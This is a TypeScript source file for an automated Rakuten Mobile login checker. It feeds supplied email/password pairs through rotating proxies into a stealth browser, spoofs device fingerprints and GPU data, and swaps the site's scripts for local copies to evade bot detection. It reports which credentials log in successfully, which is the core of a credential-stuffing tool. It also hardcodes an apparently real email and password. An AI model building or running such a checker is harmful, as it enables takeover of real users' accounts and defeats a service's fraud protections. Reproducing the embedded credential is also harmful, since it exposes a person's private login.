import { chromium } from "patchright";
import IVerifyService from "../../application/ports/IVerifyService";
import { Credential } from "../../core/entities/Credential";
import UserAgent from "user-agents"
import { sleep, IPhoneDevice, createGPUSpoofScript } from "../../utils";
import { Page, devices, Route } from "patchright";
import IProxyRepository from "../../core/repositories/IProxyRepository";
import * as fs from "fs";
import * as path from "path";
import { createRatOverrideScript, CustomRat } from "../../utils/ratOverride";
import { WorkerContext } from "../../core/value-objects/WorkerContext";
import { getNextProxy, rotateProxyIndex } from "../../core/value-objects/WorkerProxyAssignment";

const LOGIN_URL = 'https://login.account.rakuten.com/sso/authorize?r10_required_claims=r10_name&r10_audience=rae&r10_guest_login=true&r10_jid_service_id=rm001&scope=openid+memberinfo_read_safebulk+memberinfo_read_point+memberinfo_get_card_token+1Hour%40Access+90days%40Refresh&response_type=code&redirect_uri=https%3A%2F%2Fportal.mobile.rakuten.co.jp%2Fauth%2Fcallback&state=redirect_uri%3Dhttps%253A%252F%252Fportal.mobile.rakuten.co.jp%252Fdashboard%26operation%3Dlogin&client_id=rmn_app_web#/sign_in';

const TEST_ACCOUNT = {
  email: 'Hoptacquangcao2004@gmail.com',
  password: 'Tuan27022004aa'
}

export default class PlaywrightVerify implements IVerifyService {
  // Default device type - change this to switch between devices
  private deviceType: IPhoneDevice = 'iphone-13';

  // Custom RAT for fingerprint override (injected from wire layer)
  private customRat: CustomRat | null;

  // Map URL patterns to local file names
  private readonly localJsMap = new Map<string, string>([
    ['/widget/js/zxcvbn.js', 'zxcvbn.js'],
    ['/widget/js/UzBsVExITjBkWEJwWkNF-2.27.2.min.js', 'UzBsVExITjBkWEJwWkNF-2.27.2.min.js'],
  ]);

  constructor(
    private readonly proxyRepository: IProxyRepository,
    customRat: CustomRat | null
  ) {
    this.customRat = customRat;
    if (customRat) {
      console.log('[PlaywrightVerify] Custom RAT injected:', customRat.hash);
    }
  }

  /**
   * Set the iPhone device type for GPU spoofing
   * Available: iphone-11, iphone-12, iphone-12-pro, iphone-13, iphone-13-pro,
   *            iphone-13-pro-max, iphone-14, iphone-14-pro, iphone-14-pro-max,
   *            iphone-15, iphone-15-pro, iphone-15-pro-max, custom
   */
  private setDeviceType(device: IPhoneDevice): void {
    this.deviceType = device;
  }

  /**
   * Set a custom RAT (fingerprint) to override the browser fingerprint
   * Call this before verify() to use your own fingerprint
   */
  public setCustomRat(customRat: CustomRat): void {
    this.customRat = customRat;
    console.log('[RatOverride] Custom RAT set:', customRat.hash);
  }

  /**
   * Clear custom RAT and use real browser fingerprint
   */
  public clearCustomRat(): void {
    this.customRat = null;
    console.log('[RatOverride] Custom RAT cleared');
  }

  /**
   * Get the assets directory path (works in both dev and bundled environments)
   */
  private getAssetsPath(): string {
    return path.join(process.cwd(), 'assets', 'js');
  }

  /**
   * Handle local JS file serving by intercepting specific requests
   */
  private async handleLocalJs(route: Route): Promise<void> {
    const request = route.request();
    const url = request.url();

    // Check if URL matches any pattern in localJsMap
    for (const [pattern, localFileName] of this.localJsMap) {
      if (url.includes(pattern)) {
        try {
          const assetsPath = this.getAssetsPath();
          const localFilePath = path.join(assetsPath, localFileName);

          if (fs.existsSync(localFilePath)) {
            const content = fs.readFileSync(localFilePath, 'utf-8');
            await route.fulfill({
              status: 200,
              contentType: 'application/javascript',
              body: content,
            });
            console.log(`[Local JS] Served ${pattern} from local: ${localFilePath}`);
            return;
          } else {
            console.warn(`[Local JS] File not found: ${localFilePath}, falling back to remote`);
          }
        } catch (err) {
          console.error(`[Local JS] Failed to load ${localFileName}:`, err);
          // Fall through to original request
        }
      }
    }

    // Continue to original request if no match or error
    await route.continue();
  }

  async verify(credential: Credential, context: WorkerContext): Promise<boolean> {
    if (credential.password.length < 8) {
      return false;
    }

    const isDebug = process.env.AUTOMATE_DEBUG === 'true'

    const userAgentData = new UserAgent({
      deviceCategory: 'mobile',
      platform: 'iPhone'
    })

    const assignment = context.proxyAssignment;

    // Select current proxy based on index
    const proxy = getNextProxy(assignment);

    if (!proxy) {
      throw new Error(`Worker ${context.workerId}: No proxy available`);
    }

    const browser = await chromium.launch({
      channel: "chrome",
      headless: false,
      args: [
        '--no-sandbox',
        '--disable-blink-features=AutomationControlled',
        '--hide-scrollbars',
        '--disable-infobars',
        '--window-position=0,0',
        '--ignore-certificate-errors',
        '--disable-gpu-shader-disk-cache',
      ],
      proxy: {
        server: proxy.server,
        username: proxy.username ?? void 0,
        password: proxy.password ?? void 0
      }
    });

    const browserContext = await browser.newContext({
      viewport: { width: 390, height: 844 },
      deviceScaleFactor: 3,
      isMobile: true,
      hasTouch: true,
      locale: "en-US",
      timezoneId: "Asia/Bangkok",
    });

    const page = await browserContext.newPage();

    // Inject RatOverride if custom RAT is set
    // if (this.customRat) {
    //   const ratOverrideScript = createRatOverrideScript(this.customRat);
    //   await page.addInitScript(ratOverrideScript);
    //   console.log('[RatOverride] Script injected with custom RAT:', this.customRat.hash);
    // }

    // Enable local JS file routing for specific files
    await page.route('**/*.js', (route) => this.handleLocalJs(route));

    // Apply GPU spoofing based on device type
    await this.applyGPUSpoofing(page);

    const client = await browserContext.newCDPSession(page);

    await client.send('Emulation.setUserAgentOverride', {
      userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
      platform: "iPhone",
      acceptLanguage: "en-US",
      userAgentMetadata: {
        mobile: true,
        platform: "iOS",
        platformVersion: "16.6",
        architecture: "",
        model: "iPhone 13",
        brands: [
          { brand: "Apple", version: "16" },
          { brand: "Chromium", version: "119" }
        ]
      }
    });

    await client.send('Emulation.setTouchEmulationEnabled', {
        enabled: true,
        maxTouchPoints: 5, // Ép cứng số điểm chạm là 5
    });

    await client.send('Emulation.setHardwareConcurrencyOverride', {
        hardwareConcurrency: 6,
    });


    // if (isDebug) {
    //   await page.goto(LOGIN_URL);

    //   await sleep(1000000000)
    // }

    try {
      // Retry flow for /v2/login/start 400 errors
      let maxRetries = 3;
      let loginStartSuccess = false;

      await page.goto(LOGIN_URL);
      await page.waitForLoadState('networkidle');

      for (let attempt = 0; attempt < maxRetries; attempt++) {
        await page.locator('#user_id').fill(isDebug ? TEST_ACCOUNT.email : credential.email);
        const nextButton1 = await page.locator('[class*="button__submit"]').first();
        await nextButton1.waitFor({ state: 'visible', timeout: 5000 });

        // Watch for /v2/login/start response
        const loginStartPromise = page.waitForResponse(response =>
          response.url().includes('/v2/login/start')
        );

        await nextButton1.click();
        await page.waitForLoadState('networkidle');

        const loginStartResponse = await loginStartPromise;
        if (loginStartResponse.status() === 400) {
          console.log(`[Login Start] Got 400, retrying... (Attempt ${attempt + 1}/${maxRetries})`);
          await page.reload();
          await page.waitForLoadState('networkidle');
          continue;
        }

        loginStartSuccess = true;
        break;
      }

      if (!loginStartSuccess) {
        console.log('[Login Start] Max retries reached, giving up');
        return false;
      }

      // if (isDebug) {
      //   await sleep(1000000000)
      // }

      await page.waitForURL('**/sign_in/password');
      await page.locator('#password_current').fill(isDebug ? TEST_ACCOUNT.password : credential.password);
      await page.waitForLoadState('networkidle');
      await page.waitForTimeout(1000)

      const nextButton = await page.locator('[class*="button__submit"]').nth(1);

      await nextButton.waitFor({ state: 'visible', timeout: 5000 });

      const loginResponsePromise = page.waitForResponse(response =>
        response.url().includes('/v2/login/complete') &&
        response.request().method() === 'POST'
      );

      await nextButton.click()

      const loginResponse = await loginResponsePromise
      if (loginResponse.status() !== 200) {
        if (isDebug) {
          console.log('Login failed')
          await sleep(1000000000)
        }
        return false
      }

      const isDataUsageBoxVisible = await this.checkDataUsageBox(page);
      if (!isDataUsageBoxVisible) {
        if (isDebug) {
          console.log('Data usage box not found')
          await sleep(1000000000)
        }
        return false;
      }

      const isVerified = await this.checkDataUsageBox(page)

      if (isDebug) {
        console.log('Verified')
        await sleep(1000000000)
      }

      return isVerified
    } catch (e) {
      // Mark proxy as dead on error
      await this.proxyRepository.markProxyDead(proxy.id);
      console.error(e)
      return false;
    } finally {
      await browserContext.close();
      await browser.close();

      // Round-robin to next proxy if both are available
      rotateProxyIndex(assignment);
    }
  }

  private async checkDataUsageBox(page: Page, retryCount: number = 0): Promise<boolean> {
    try {
      console.log(`Checking Data Usage Box (Attempt ${retryCount + 1})...`);

      // Handle "You are already signed in" page if present
      await this.handleAlreadySignedInPage(page);

      // Now check for the data usage box
      const dataUsageBox = page.locator('rktn-home-data-usage[itemid="d_home_2"]');
      await dataUsageBox.waitFor({ state: 'visible', timeout: 15000 });
      return true;
    } catch (e) {
      if (retryCount < 4) {
        console.log("Element not found, reloading page...");

        if (page.url().includes('dashboard')) {
            await page.reload({ waitUntil: 'domcontentloaded' });
            await page.waitForTimeout(3000);
            return this.checkDataUsageBox(page, retryCount + 1);
        }
      }
      return false;
    }
  }

  /**
   * Check if the "You are already signed in" page is displayed
   * and handle it by clicking the Continue button
   */
  private async handleAlreadySignedInPage(page: Page): Promise<boolean> {
    try {
      const alreadySignedInText = page.getByText('You are already signed in');
      const isVisible = await alreadySignedInText.isVisible().catch(() => false);

      if (isVisible) {
        console.log('Detected "You are already signed in" page, clicking Continue button...');
        const continueButton = page.locator('#prim_81', { hasText: 'Continue' });
        await continueButton.waitFor({ state: 'visible', timeout: 5000 });
        await continueButton.click();
        await page.waitForLoadState('networkidle');
        console.log('Continue button clicked, proceeding to dashboard...');
        return true;
      }
      return false;
    } catch (e) {
      console.log('No "You are already signed in" page detected or error handling it:', e);
      return false;
    }
  }

  /**
   * Apply GPU spoofing to the page based on the current device type
   * This overrides WebGL fingerprinting to match the selected iPhone device
   */
  private async applyGPUSpoofing(page: Page): Promise<void> {
    const spoofScript = createGPUSpoofScript(this.deviceType);
    await page.addInitScript(spoofScript);
    console.log(`[GPU Spoofing] Applied for device: ${this.deviceType}`);
  }
}
